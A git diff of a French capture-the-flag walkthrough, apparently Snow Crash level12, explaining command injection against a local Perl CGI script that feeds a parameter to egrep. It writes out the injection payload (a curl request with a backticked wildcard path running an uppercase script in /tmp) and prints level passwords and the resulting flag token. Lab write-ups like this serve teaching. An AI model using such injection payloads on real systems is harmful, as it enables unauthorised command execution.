@@ -22,6 +22,7 @@ Password:fa6v5ateaw21peobuub8ipe6s
 Le Home contient un script perl :
 
 ```
+:~$ cat level.pl
 #!/usr/bin/env perl
 # localhost:4646 (ici indique qu'il écoute sur le port :4646)
 use CGI qw{param};
@@ -55,35 +56,24 @@ n(t(param("x"), param("y"))); (ici prends 2 paramétres x et y)
 ```
 
 On remarque que le script est un serveur qui écoute sur le port `:4646` et utilise un `egrep`. On peux aussi voir que le script prends 2 paramétres `x` et `y`, et que le fichier passé  en `x` doit forcément être en masjuscule, car une regex passe cet argument en uppercase, tandis que l'argument `y` n'est juste pas utilisé.\
-Je vais de ce fait créer un lien symbolique avec la commande getflag, en prenant soin de l'écrire en masjuscule :
+
+On va alors créer un script en se déplaçant dans `/tmp` que l'on pourra appeler depuis level12.pl ne prenant soin de respecter quelques étapes, dont la plus importante, le nom du script devra être en majuscule.
 
 ```
-:~$ ln -s /bin/getflag /tmp/GETFLAG
+:~$ cd /tmp
 
-:~$ /*/GETFLAG (ici j'utilise une `*` pour éviter le passage du caractère en uppercase)
-Check flag.Here is your token :
-Nope there is no token here for you sorry. Try again :)
-```
+:~$ echo "getflag > /tmp/flag12" > GETFLAG
 
-On peux voir que le lien permet bien d'exécuter la commande. Maintenant il faut faire en sorte qu'il soit lancé par le script pour en récupérer le résultat.
+:~$ chmod 777 GETFLAG (ici je lui donne des droits, sinon il ne pourra pas utiliser la commande `getflag`)
 
+:~$ cd
 
-
-
-
-
-
-AAAAAAAAAAA
-
-```
-:~$ curl 'localhost:4646/?x=`/*/GETFLAG`'
+:~$ curl 'localhost:4646/?x=`/*/GETFLAG`' (ici j'utilise une `*` pour éviter le passage du caractère en uppercase)
 
 :~$ cat /tmp/flag12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 
 ```
-
-
 
 Le flag nous permet de se connecter au level13
 `level13:g1qKMiRpXf53AWhDaU7FEkczr`
